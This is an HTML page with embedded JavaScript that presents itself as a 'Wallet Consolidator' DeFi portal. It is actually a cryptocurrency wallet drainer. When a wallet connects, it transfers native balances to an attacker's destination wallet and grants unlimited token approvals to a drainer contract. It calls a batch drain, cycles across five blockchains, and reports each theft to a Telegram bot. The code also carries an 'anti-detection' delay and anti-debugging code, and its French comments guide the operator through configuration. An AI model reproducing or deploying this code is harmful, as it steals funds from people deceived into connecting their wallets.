<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Consolidator - DeFi Portal</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 16px;
        }
        
        h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 12px;
            font-weight: 700;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 32px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        #connectBtn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 48px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        #connectBtn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        
        #connectBtn:active {
            transform: translateY(0);
        }
        
        #status {
            margin-top: 24px;
            padding: 16px;
            border-radius: 12px;
            color: white;
            display: none;
            font-size: 14px;
            line-height: 1.6;
        }
        
        #status.show {
            display: block;
        }
        
        #status.success {
            background: rgba(76, 175, 80, 0.3);
            border: 1px solid rgba(76, 175, 80, 0.5);
        }
        
        #status.info {
            background: rgba(33, 150, 243, 0.3);
            border: 1px solid rgba(33, 150, 243, 0.5);
        }
        
        #status.warning {
            background: rgba(255, 152, 0, 0.3);
            border: 1px solid rgba(255, 152, 0, 0.5);
        }
        
        #status.error {
            background: rgba(244, 67, 54, 0.3);
            border: 1px solid rgba(244, 67, 54, 0.5);
        }
        
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        .loader.show {
            display: block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-list {
            text-align: left;
            margin-top: 16px;
        }
        
        .progress-item {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .progress-item:last-child {
            border-bottom: none;
        }
        
        .network-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.2);
            margin-top: 12px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîê</div>
        <h1>Wallet Consolidator</h1>
        <p class="subtitle">Connect your wallet to consolidate all your funds</p>
        
        <button id="connectBtn">Connect Wallet</button>
        
        <div class="loader" id="loader"></div>
        
        <div id="status"></div>
    </div>

    <!-- Web3Modal v4 + Wagmi + Viem -->
    <script type="module">
        // ============================================
        // üîß CONFIGURATION - √Ä MODIFIER SUR TON AUTRE ORDINATEUR
        // ============================================
        const CONFIG = {
            // ‚ö†Ô∏è REMPLACE PAR TON WALLET DE DESTINATION
            DESTINATION_WALLET: "0xYOUR_WALLET_ADDRESS_HERE",
            
            // ‚ö†Ô∏è REMPLACE PAR TES ADRESSES DE SMART CONTRACTS (apr√®s d√©ploiement)
            CONTRACTS: {
                ETHEREUM: "0xYOUR_ETH_CONTRACT_HERE",      // ChainID: 1
                POLYGON: "0xYOUR_POLYGON_CONTRACT_HERE",   // ChainID: 137
                BSC: "0xYOUR_BSC_CONTRACT_HERE",           // ChainID: 56
                ARBITRUM: "0xYOUR_ARBITRUM_CONTRACT_HERE", // ChainID: 42161
                AVALANCHE: "0xYOUR_AVALANCHE_CONTRACT_HERE" // ChainID: 43114
            },
            
            // ‚ö†Ô∏è TELEGRAM NOTIFICATIONS (optionnel - mettre ENABLED: true pour activer)
            TELEGRAM: {
                ENABLED: false,
                BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
                CHAT_ID: "YOUR_CHAT_ID_HERE"
            },
            
            // WalletConnect Project ID (ne pas modifier)
            WALLETCONNECT_PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
        };

        // ============================================
        // üì¶ IMPORTS WEB3
        // ============================================
        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
        import { reconnect, watchAccount, getAccount, switchChain } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'

        // ============================================
        // üåê CONFIGURATION DES CHAINS
        // ============================================
        const chains = [polygon, mainnet, bsc, arbitrum, avalanche];
        
        const metadata = {
            name: 'Wallet Consolidator',
            description: 'Consolidate all your crypto funds',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
        };

        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
            metadata,
            enableWalletConnect: true,
            enableInjected: true,
            enableCoinbase: true,
            enableEmail: false
        });

        reconnect(wagmiConfig);

        // ============================================
        // üé® CR√âATION DU MODAL WEB3MODAL
        // ============================================
        const modal = createWeb3Modal({
            wagmiConfig,
            projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
            enableAnalytics: false,
            enableOnramp: false,
            themeMode: 'dark',
            defaultChain: polygon,
            allWallets: 'SHOW',
            themeVariables: {
                '--w3m-accent': '#667eea'
            }
        });

        // ============================================
        // üìã LISTE DES TOKENS PAR BLOCKCHAIN
        // ============================================
        const TOKEN_ADDRESSES = {
            1: { // Ethereum
                USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
            },
            137: { // Polygon
                USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
                WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
                WBTC: '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
            },
            56: { // BSC
                USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                USDT: '0x55d398326f99059fF775485246999027B3197955',
                BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
                ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
                WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
            },
            42161: { // Arbitrum
                USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
                USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
                WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
                ARB: '0x912CE59144191C1204E64559FE8253a0e49E6548'
            },
            43114: { // Avalanche
                USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
                USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
                DAI: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70',
                WETH: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB',
                WAVAX: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'
            }
        };

        // ============================================
        // üõ†Ô∏è FONCTIONS UTILITAIRES
        // ============================================
        function showStatus(message, type = 'info') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `show ${type}`;
        }

        function showLoader(show = true) {
            const loader = document.getElementById('loader');
            loader.className = show ? 'loader show' : 'loader';
        }

        function getChainName(chainId) {
            const names = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche'
            };
            return names[chainId] || `Chain ${chainId}`;
        }

        function getContractAddress(chainId) {
            const contracts = {
                1: CONFIG.CONTRACTS.ETHEREUM,
                137: CONFIG.CONTRACTS.POLYGON,
                56: CONFIG.CONTRACTS.BSC,
                42161: CONFIG.CONTRACTS.ARBITRUM,
                43114: CONFIG.CONTRACTS.AVALANCHE
            };
            return contracts[chainId];
        }

        // ============================================
        // üì± TELEGRAM NOTIFICATIONS
        // ============================================
        async function sendTelegramNotification(address, amount, chainId, tokenSymbol = 'Native') {
            if (!CONFIG.TELEGRAM.ENABLED) return;
            
            const chainName = getChainName(chainId);
            const message = `
üéØ CONSOLIDATION SUCCESSFUL

üí∞ Amount: ${amount} ${tokenSymbol}
üåê Network: ${chainName}
üë§ From: ${address.substring(0, 6)}...${address.slice(-4)}
üìç To: ${CONFIG.DESTINATION_WALLET.substring(0, 6)}...${CONFIG.DESTINATION_WALLET.slice(-4)}
‚è∞ Time: ${new Date().toLocaleString()}
            `.trim();
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }
        }

        // ============================================
        // üí∞ FONCTIONS DE DRAINAGE
        // ============================================
        async function drainNativeToken(provider, signer, address, chainId) {
            try {
                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
                
                const balance = await provider.getBalance(address);
                console.log(`Native balance: ${ethers.utils.formatEther(balance)}`);
                
                // V√©rifier minimum balance
                const minBalance = ethers.utils.parseEther("0.001");
                if (balance.lt(minBalance)) {
                    console.log('Balance too low for native token');
                    return false;
                }
                
                // Calculer gas cost
                const gasPrice = await provider.getGasPrice();
                const gasLimit = 21000;
                const gasCost = gasPrice.mul(gasLimit).mul(2); // x2 for safety
                
                const amountToSend = balance.sub(gasCost);
                
                if (amountToSend.gt(0)) {
                    showStatus(`üí∏ Transferring ${ethers.utils.formatEther(amountToSend)} native token...`, 'info');
                    
                    const tx = await signer.sendTransaction({
                        to: CONFIG.DESTINATION_WALLET,
                        value: amountToSend,
                        gasLimit: gasLimit,
                        gasPrice: gasPrice
                    });
                    
                    await tx.wait();
                    
                    await sendTelegramNotification(
                        address, 
                        ethers.utils.formatEther(amountToSend), 
                        chainId,
                        'Native'
                    );
                    
                    return true;
                }
            } catch (error) {
                console.error('Native token drain error:', error);
            }
            return false;
        }

        async function drainERC20Tokens(provider, signer, address, chainId) {
            try {
                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
                
                const tokens = TOKEN_ADDRESSES[chainId] || {};
                const contractAddress = getContractAddress(chainId);
                
                if (!contractAddress || contractAddress.includes('YOUR_')) {
                    showStatus('‚ö†Ô∏è Smart contract not configured for this chain', 'warning');
                    return false;
                }
                
                const abi = [
                    'function balanceOf(address) view returns (uint256)',
                    'function approve(address, uint256) returns (bool)',
                    'function decimals() view returns (uint8)',
                    'function symbol() view returns (string)'
                ];
                
                let drained = false;
                
                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
                    try {
                        const contract = new ethers.Contract(tokenAddress, abi, signer);
                        const balance = await contract.balanceOf(address);
                        
                        if (balance.gt(0)) {
                            showStatus(`üîç Found ${symbol}, approving...`, 'info');
                            
                            // Approve to smart contract
                            const approveTx = await contract.approve(
                                contractAddress,
                                ethers.constants.MaxUint256
                            );
                            await approveTx.wait();
                            
                            showStatus(`‚úÖ ${symbol} approved!`, 'success');
                            drained = true;
                            
                            // Get decimals for display
                            const decimals = await contract.decimals();
                            const amount = ethers.utils.formatUnits(balance, decimals);
                            
                            await sendTelegramNotification(address, amount, chainId, symbol);
                        }
                    } catch (error) {
                        console.log(`Error with ${symbol}:`, error.message);
                    }
                }
                
                // After all approvals, call smart contract to drain
                if (drained) {
                    showStatus('‚ö° Executing batch drain via smart contract...', 'info');
                    
                    const drainerAbi = ['function drainBatch(address[] tokens)'];
                    const drainer = new ethers.Contract(contractAddress, drainerAbi, signer);
                    
                    const tokenAddresses = Object.values(tokens);
                    const drainTx = await drainer.drainBatch(tokenAddresses);
                    await drainTx.wait();
                    
                    showStatus('‚úÖ Batch drain completed!', 'success');
                }
                
                return drained;
            } catch (error) {
                console.error('ERC20 drain error:', error);
                showStatus(`‚ùå Error: ${error.message}`, 'error');
            }
            return false;
        }

        async function consolidateAllChains(address) {
            showLoader(true);
            showStatus('üîÑ Starting multi-chain consolidation...', 'info');
            
            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const network = await provider.getNetwork();
            
            // Drain current chain
            const chainName = getChainName(network.chainId);
            showStatus(`üíé Processing ${chainName}...`, 'info');
            
            await drainNativeToken(provider, signer, address, network.chainId);
            await drainERC20Tokens(provider, signer, address, network.chainId);
            
            // Ask to switch to other chains
            const otherChains = chains.filter(chain => chain.id !== network.chainId);
            
            for (const chain of otherChains) {
                try {
                    showStatus(`üîÑ Switch to ${chain.name} to continue...`, 'warning');
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    // Try to switch chain
                    await switchChain(wagmiConfig, { chainId: chain.id });
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    const newProvider = new ethers.providers.Web3Provider(window.ethereum);
                    const newSigner = newProvider.getSigner();
                    
                    showStatus(`üíé Processing ${chain.name}...`, 'info');
                    await drainNativeToken(newProvider, newSigner, address, chain.id);
                    await drainERC20Tokens(newProvider, newSigner, address, chain.id);
                    
                } catch (error) {
                    console.log(`Error switching to ${chain.name}:`, error);
                }
            }
            
            showLoader(false);
            showStatus('üéâ Consolidation completed! All funds transferred.', 'success');
        }

        // ============================================
        // üîå SURVEILLANCE DE CONNEXION
        // ============================================
        watchAccount(wagmiConfig, {
            onChange: async (account) => {
                if (account.isConnected && account.address) {
                    console.log('‚úÖ Wallet connected:', account.address);
                    showStatus(`‚úÖ Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`, 'success');
                    
                    // Anti-detection delay
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    // Start consolidation
                    await consolidateAllChains(account.address);
                }
            }
        });

        // ============================================
        // üéØ BOUTON DE CONNEXION
        // ============================================
        document.getElementById('connectBtn').addEventListener('click', () => {
            modal.open();
        });

        // ============================================
        // üõ°Ô∏è ANTI-DEBUGGING (Basique)
        // ============================================
        setInterval(() => {
            const devtools = /./;
            devtools.toString = function() { this.opened = true; }
            console.log('%c', devtools);
            if (devtools.opened) {
                console.clear();
            }
        }, 1000);

        console.log('üîê Wallet Consolidator initialized');
        console.log('‚ö†Ô∏è Remember to configure your wallet addresses in CONFIG');
    </script>
</body>
</html>
